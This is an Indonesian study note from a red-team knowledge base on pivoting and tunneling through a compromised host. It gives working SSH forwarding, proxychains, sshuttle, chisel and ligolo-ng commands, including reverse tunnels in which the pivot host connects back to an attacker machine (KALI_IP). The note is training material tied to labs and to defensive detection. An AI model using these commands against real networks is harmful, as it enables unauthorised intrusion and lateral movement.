# 🌐🔀 Pivoting & Tunneling Lanjutan

> [!summary] Ringkasan
> Lanjutan dari [[Post-Exploitation & Pivoting]]: setelah menguasai satu mesin (*foothold*), kita perlu menjangkau jaringan internal yang tak terlihat dari luar. Note ini mendalami **tunneling & pivoting** modern — **SOCKS proxy**, **port forwarding** (local/remote/dynamic), tool **chisel**, **ligolo-ng**, **sshuttle**, **proxychains**, hingga **double pivot** (berlapis). Keterampilan ini dipakai langsung oleh [[C2 Frameworks (Command & Control)]].

**Bagian dari:** [[Red Team (MOC)]]
**Prasyarat:** [[Post-Exploitation & Pivoting]], [[Jaringan Komputer]]

> [!note] Kapan ini relevan
> Saat `nmap` dari Kali tak bisa menyentuh subnet internal (mis. `10.10.20.0/24`) padahal kamu sudah punya shell di mesin yang **bisa** menjangkaunya. Mesin foothold itu jadi "jembatan".

---

## 🧠 Konsep Inti

### Pivot = jadikan host yang dikuasai sebagai jembatan
```text
[Kali penyerang] --internet--> [DMZ host (dikuasai)] --internal--> [10.10.20.0/24 tersembunyi]
                                  ^ pivot point / jump host
```
Tujuan: alirkan trafik tool kita **melewati** host pivot ke jaringan dalam.

### Tiga bentuk SSH port forwarding (wajib paham)
| Mode | Flag | Fungsi |
|---|---|---|
| **Local** | `-L [lport]:[target]:[tport]` | port lokal kita → layanan internal tunggal |
| **Remote** | `-R [rport]:[target]:[tport]` | buka port di host remote → balik ke kita (berguna saat firewall keluar) |
| **Dynamic** | `-D [port]` | buat **SOCKS proxy** → akses *seluruh* jaringan internal lewat satu port |

### SOCKS proxy + proxychains
**Dynamic forward** membuat SOCKS proxy. **proxychains** memaksa tool (nmap, curl, smbclient) melewati proxy itu → seolah berasal dari host pivot.

### Double pivot (berlapis)
Jaringan dalam punya jaringan **lebih dalam** lagi. Pivot bertingkat: Kali → host A → host B → subnet C. Tiap lapis menambah proxy/forward. **ligolo-ng** paling nyaman untuk ini (membuat antarmuka `tun` → routing biasa, tanpa proxychains).

### Reverse vs bind
- **Reverse** (host internal → kita) lebih sering berhasil karena firewall biasanya longgar untuk **trafik keluar**.
- **Bind** (kita → host) butuh port masuk terbuka.

## ⚙️ Praktik

```bash
# --- SSH: tiga mode ---
ssh -L 8080:10.10.20.5:80 user@pivot       # local: akses web internal via localhost:8080
ssh -R 9001:127.0.0.1:9001 user@pivot      # remote: buka port di pivot kembali ke kita
ssh -D 1080 user@pivot                     # dynamic: SOCKS proxy di :1080

# proxychains pakai SOCKS di atas (set di /etc/proxychains4.conf: socks5 127.0.0.1 1080)
proxychains nmap -sT -Pn 10.10.20.0/24
proxychains smbclient -L //10.10.20.10/

# --- sshuttle (VPN-like, paling mudah jika ada kredensial SSH) ---
sshuttle -r user@pivot 10.10.20.0/24       # routing transparan, tanpa proxychains
```

```bash
# --- chisel (tanpa SSH; bagus saat hanya ada shell biasa) ---
# di Kali (server):
./chisel server -p 8000 --reverse
# di host pivot (client) → reverse SOCKS:
./chisel client KALI_IP:8000 R:socks
# lalu proxychains lewat socks 127.0.0.1:1080

# --- ligolo-ng (rekomendasi modern, mendukung double pivot rapi) ---
# di Kali (proxy):  ./proxy -selfcert
# di pivot (agent): ./agent -connect KALI_IP:11601 -ignore-cert
# di Kali ligolo:  session → start ; lalu tambahkan rute:
#   sudo ip route add 10.10.20.0/24 dev ligolo
# setelah itu nmap/tool jalan LANGSUNG ke subnet (tanpa proxychains)
```

> [!tip] Pilih alat sesuai situasi
> Ada kredensial SSH → **sshuttle** (paling cepat). Hanya shell + ingin SOCKS → **chisel**. Butuh akses subnet seperti jaringan biasa / double pivot → **ligolo-ng** (interface `tun`, paling bersih). C2 (Sliver/CS) punya SOCKS built-in (`socks5 start`).

## 🧰 Tools

- **ligolo-ng** — pivoting via antarmuka `tun`, mulus untuk multi-hop (rekomendasi).
- **chisel** — tunnel TCP/SOCKS over HTTP, satu biner Go, tanpa SSH.
- **sshuttle** — "VPN poor-man's" via SSH, transparan.
- **proxychains-ng** — paksa tool melewati SOCKS/HTTP proxy.
- **OpenSSH** — `-L/-R/-D` forwarding bawaan.
- **socat / plink.exe** — relay & forwarding (Windows: plink/netsh portproxy).

## 🔗 Kaitan

- Dasar: [[Post-Exploitation & Pivoting]]; dipakai operasi C2: [[C2 Frameworks (Command & Control)]] (SOCKS over beacon).
- Setelah pivot → ulang siklus: [[Scanning & Enumeration]] · [[Active Directory Attacks]] di subnet baru.
- Pivot antar pod/cluster: [[Container & Kubernetes Offense]]; lewat WiFi/IoT foothold: [[Lab — WiFi Hacking (Wireless)]] · [[Lab — IoT & Embedded Hacking]].
- **Sisi Blue ↔** [[Network Security Lanjutan (NSM-NDR)]] (deteksi tunnel/SOCKS & beaconing), [[Network Security (Firewall, IDS-IPS)]] (segmentasi/egress filtering melawan pivot), [[Threat Hunting]] (jejak port-forward).

## 🎯 Latihan

- **TryHackMe — "Wreath"** (network pivoting penuh), **"Pivoting"**, **"Holo"**.
- **HackTheBox — "Pivoting / Tunneling and Port Forwarding"** (Academy module) & lab Pro Labs (Dante/Offshore) yang menuntut double pivot.
- Bangun 3 VM (Kali → pivot → target tersembunyi) lalu raih target hanya lewat pivot.

## 📖 Sumber

- **HackTricks — Tunneling and Port Forwarding** — https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
- **ligolo-ng** — https://github.com/nicocha30/ligolo-ng
- **chisel** — https://github.com/jpillora/chisel
- **0xdf / Ippsec** write-up box dengan pivoting (sangat instruktif).
